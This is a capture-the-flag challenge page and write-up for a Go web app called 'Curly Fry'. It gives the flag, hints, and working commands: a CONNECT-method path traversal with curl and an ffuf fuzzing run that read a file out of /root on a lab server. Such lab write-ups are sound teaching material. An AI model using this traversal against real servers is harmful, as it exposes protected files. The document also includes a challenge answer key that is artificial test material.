# Curly Fry

p.s. For testing, go to [INSTALL.md](https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/blob/main/Web/Curly%20Fry/INSTALL.md)

### Description
Who needs Flask when you have Golang -- the new meta for web apps. Check out this super slick and functional website. 

### Difficulty
Easy

### Flag
`PCTF{tru5t_m3_im_4_ch3f}`

### Hints
1. Golang path traversal
2. Fuzz /root directory for file name

### Author
Daniel Getter (NihilistPenguin)

### Tester
None yet

### Writeup

This is a path travesal/fuzzing challenge. In golang, the library `net/http` usually transforms the path to a canonical one before accessing it:
```
/flag/   -- Is responded with a redirect to /flag
/../flag -- Is responded with a redirect to /flag
/flag/.  -- Is responded with a redirect to /flag
```
However, when the CONNECT method is used this doesn't happen. So, if you need to access some protected resource you can abuse this trick: 
`curl --path-as-is -X CONNECT http://gofs.web.jctf.pro/../flag`

Above text copied from: https://book.hacktricks.xyz/pentesting/pentesting-web/golang

We know the flag is in the `/root` directory but we do not know the file name. We can fuzz this:

```console
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://localhost/../../../../../../../root/FUZZ -e .txt -X CONNECT -c -fs 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : CONNECT
 :: URL              : http://localhost/../../../../../../../root/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 50
________________________________________________

recipe.txt              [Status: 200, Size: 429, Words: 68, Lines: 15]
```

The `-fs 50` filters out all responses where the response size is 50. If you fuzz without a filter, you will see a `Status: 200, Size: 50` for every fuzzing attempt, which is just the default web server response: `The path provided is not a file or does not exist.` Thus, we filter out those responses.

We saw that `recipe.txt` was a hit, so let's curl it.

```console
$ curl --path-as-is -X CONNECT http://localhost/../../../../../../../root/recipe.txt
Ingredients: for 2 servings
- 2 curly potatoes
- 2 tablespoons of old bay seasoning
- ketchup and malt vinegar

Preparation
1. Preheat oven to 420°F
2. Slice the potatoes with a knife as they are already curly to begin with
3. Put your seasoning on em
4. Just throw them into the oven
5. Bake until they look good, idk.
6. Put ketchup on a plate and stir in a little malt vinegar
7. Enjoy!
8. Get flag: PCTF{tru5t_m3_im_4_ch3f}
```
